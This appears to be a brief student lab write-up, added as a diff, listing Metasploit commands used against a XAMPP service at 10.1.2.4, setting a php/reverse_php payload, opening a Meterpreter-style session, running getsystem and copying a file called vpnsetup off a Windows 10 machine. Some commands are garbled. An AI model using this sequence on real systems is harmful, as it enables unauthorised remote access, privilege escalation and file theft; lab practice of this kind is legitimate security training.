@@ -1,0 +1,18 @@
+For gaining remote access, used msfconsole, xampp, payloads, meterpreter. Created sessions using payloads.
+
+Command Used: 
+msfconsole
+search xampp
+show options
+set RHOSTS 10.1.2.4
+run
+show payloads
+set payload php/reverse_phppayload => php/reverse_php
+sessions
+set session 1
+sessiona -i 1	
+getuid
+getsystem
+
+By those command and steps, we got access of win10 machine and also used win10 remote access for running the payload. Without any problem, managed to bring a file name vpnsetup from win10 machine.
+This is marked in redbox in the output picture.	
